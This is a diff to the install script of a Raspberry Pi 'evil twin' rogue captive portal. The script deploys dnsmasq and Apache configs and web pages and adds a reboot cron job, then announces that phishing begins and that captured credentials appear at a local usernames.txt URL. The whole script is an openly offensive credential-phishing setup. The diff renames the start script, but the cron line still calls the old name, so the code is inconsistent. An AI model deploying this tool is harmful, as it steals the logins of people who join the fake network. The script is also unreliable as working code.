@@ -14,14 +14,14 @@ cp -f dnsmasq.conf /etc/
 cp -Rf html /var/www/
 chown -R www-data:www-data /var/www/html
 chown root:www-data /var/www/html/.htaccess
-cp -f ConPineHarvesterStart.sh /root/
+cp -f PiEvilTwinStart.sh /root/
 crontab -l | { cat; echo "@reboot     sudo sleep 15 && sudo sh /root/ConPineHarvesterStart.sh &"; } | crontab -
-chmod +x /root/ConPineHarvesterStart.sh
+chmod +x /root/PiEvilTwinStart.sh
 cp -f override.conf /etc/apache2/conf-available/
 cd /etc/apache2/conf-enabled
 ln -s ../conf-available/override.conf override.conf
 cd /etc/apache2/mods-enabled
 ln -s ../mods-available/rewrite.load rewrite.load
 
-echo "Rogue captive portal installed. Reboot and wait 15-20 seconds to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
+echo "PiEvilTwin captive portal installed. Reboot and wait 15-20 seconds to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
 exit 0
